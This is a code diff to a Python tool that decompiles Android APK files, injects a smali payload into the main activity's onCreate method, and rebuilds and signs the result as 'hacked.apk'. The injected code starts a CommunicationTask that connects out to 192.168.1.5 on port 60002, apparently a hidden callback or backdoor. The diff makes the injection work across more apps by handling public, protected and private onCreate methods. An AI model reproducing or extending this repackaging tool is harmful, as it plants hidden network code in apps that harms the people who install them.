@@ -3,28 +3,8 @@ import shutil
 import subprocess
 import zipfile
 from distutils.dir_util import copy_tree
-
+from ..utils import filesystem
 from bs4 import BeautifulSoup as bs
-
-pezzotto = """
-invoke-static {}, Lcom/example/a2_faces_trial/TaskRunner;->getInstance()Lcom/example/a2_faces_trial/TaskRunner;
-
-move-result-object v2
-
-new-instance v3, Lcom/example/a2_faces_trial/CommunicationTask;
-
-invoke-virtual {p0}, Lcom/example/a2_faces_trial/MainActivity;->getApplicationContext()Landroid/content/Context;
-
-move-result-object v4
-
-const-string v5, "192.168.1.5"
-
-const v6, 0xea62
-
-invoke-direct {v3, v4, v5, v6}, Lcom/example/a2_faces_trial/CommunicationTask;-><init>(Landroid/content/Context;Ljava/lang/String;I)V
-
-invoke-virtual {v2, v3}, Lcom/example/a2_faces_trial/TaskRunner;->execute(Ljava/lang/Runnable;)V
-"""
 
 
 def disas(file_name):
@@ -34,6 +14,28 @@ def disas(file_name):
         os.mkdir(os.getcwd() + f'/upload_dir/tmp_{file_name}')
 
     subprocess.call(['java', '-jar', 'javalib/apktool_2.5.0.jar', 'd', f'upload_dir/{file_name}.apk', '-o', f'upload_dir/tmp_{file_name}', '-f'])
+
+
+def get_custom_pezzotto(main_activity_escaped: str):
+    return """
+    invoke-static {}, Lcom/example/a2_faces_trial/TaskRunner;->getInstance()Lcom/example/a2_faces_trial/TaskRunner;
+    
+    move-result-object v2
+    
+    new-instance v3, Lcom/example/a2_faces_trial/CommunicationTask;
+    
+    invoke-virtual {p0}, L""" + main_activity_escaped + """;->getApplicationContext()Landroid/content/Context;
+    
+    move-result-object v4
+    
+    const-string v5, "192.168.1.5"
+    
+    const v6, 0xea62
+    
+    invoke-direct {v3, v4, v5, v6}, Lcom/example/a2_faces_trial/CommunicationTask;-><init>(Landroid/content/Context;Ljava/lang/String;I)V
+    
+    invoke-virtual {v2, v3}, Lcom/example/a2_faces_trial/TaskRunner;->execute(Ljava/lang/Runnable;)V
+    """
 
 
 def add_pezzotto(file_name):
@@ -63,7 +65,17 @@ def add_pezzotto(file_name):
     main_activity_content = m_file.read()
     m_file.close()
 
-    i = main_activity_content.index(".method protected onCreate(Landroid/os/Bundle;)V") + len(".method protected onCreate(Landroid/os/Bundle;)V")
+    i = 0
+    if ".method public onCreate(Landroid/os/Bundle;)V" in main_activity_content:
+        i = main_activity_content.index(".method public onCreate(Landroid/os/Bundle;)V") + len(
+            ".method public onCreate(Landroid/os/Bundle;)V")
+    elif ".method protected onCreate(Landroid/os/Bundle;)V" in main_activity_content:
+        i = main_activity_content.index(".method protected onCreate(Landroid/os/Bundle;)V") + len(
+            ".method protected onCreate(Landroid/os/Bundle;)V")
+    elif ".method private onCreate(Landroid/os/Bundle;)V" in main_activity_content:
+        i = main_activity_content.index(".method private onCreate(Landroid/os/Bundle;)V") + len(
+            ".method private onCreate(Landroid/os/Bundle;)V")
+
     before = main_activity_content[0:i]
     after = main_activity_content[i:]
 
@@ -71,7 +83,7 @@ def add_pezzotto(file_name):
     after1 = after[0:i2]
     after2 = after[i2:]
 
-    main_activity_content = before + after1 + pezzotto + after2
+    main_activity_content = before + after1 + get_custom_pezzotto(main_activity_escaped) + after2
 
     m_file = open(main_activity_path, "w")
     m_file.write(main_activity_content)
@@ -79,14 +91,20 @@ def add_pezzotto(file_name):
 
 
 def reassemble(file_name):
-    subprocess.call(['java', '-jar', 'javalib/apktool_2.5.0.jar', 'b', f'upload_dir/tmp_{file_name}', '-o', 'upload_dir/test-hacked.apk', '-f'])
+    subprocess.call(['java', '-jar', 'javalib/apktool_2.5.0.jar', 'b', f'upload_dir/tmp_{file_name}', '-o', f'upload_dir/tmp_{file_name}/hacked.apk', '-f'])
 
 
 def sign(file_name):
-    print('f')
     subprocess.call(
         ['java', '-jar', 'javalib/apksigner.jar', 'sign', '--ks', 'javalib/debug.keystore', '--ks-key-alias', 'androiddebugkey', '--ks-pass',
-         'pass:android', 'upload_dir/test-hacked.apk'])
+         'pass:android', '--out', f'upload_dir/tmp_{file_name}/signed_hacked.apk', f'upload_dir/tmp_{file_name}/hacked.apk'])
+
+    new_file = open(f'upload_dir/tmp_{file_name}/signed_hacked.apk', 'rb')
+
+    md5, sha1, size = filesystem.eval_hash_and_size(new_file)
+    shutil.copy(f'upload_dir/tmp_{file_name}/signed_hacked.apk', f'upload_dir/{sha1}.apk')
+
+    return md5, sha1, size
 
 
 def find_main_activity(manifest_path):
